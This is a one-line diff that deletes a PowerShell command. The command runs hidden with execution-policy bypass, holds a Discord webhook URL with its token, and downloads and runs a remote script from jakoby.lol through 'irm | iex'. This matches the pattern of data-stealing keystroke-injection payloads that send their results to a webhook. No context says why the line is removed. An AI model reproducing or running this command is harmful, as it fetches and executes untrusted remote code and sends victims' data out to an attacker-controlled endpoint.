@@ -1,1 +1,0 @@
-powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1136362073249558680/Rw0t4WMAUinfgbkCqntrgY3SYBzlZzhrGgr6Eg8bMCSJijwKDZGORVxALq-Ih6krzei9';$db='';irm jakoby.lol/f0x | iex
